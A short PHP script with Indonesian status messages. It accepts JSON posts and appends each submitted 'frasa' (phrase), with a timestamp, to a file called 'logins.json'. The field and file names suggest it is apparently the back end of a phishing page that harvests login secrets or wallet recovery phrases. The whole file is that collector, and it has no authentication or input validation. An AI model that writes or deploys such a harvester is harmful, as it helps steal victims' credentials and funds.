<?php
$data = json_decode(file_get_contents('php://input'), true);
if ($data) {
    $file = 'logins.json';
    $currentData = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
    $currentData[] = [
        'frasa' => $data['frasa'],
        'timestamp' => date("Y-m-d H:i:s")
    ];
    file_put_contents($file, json_encode($currentData, JSON_PRETTY_PRINT));
    echo "Data berhasil disimpan!";
} else {
    echo "Gagal menyimpan data.";
}
?>
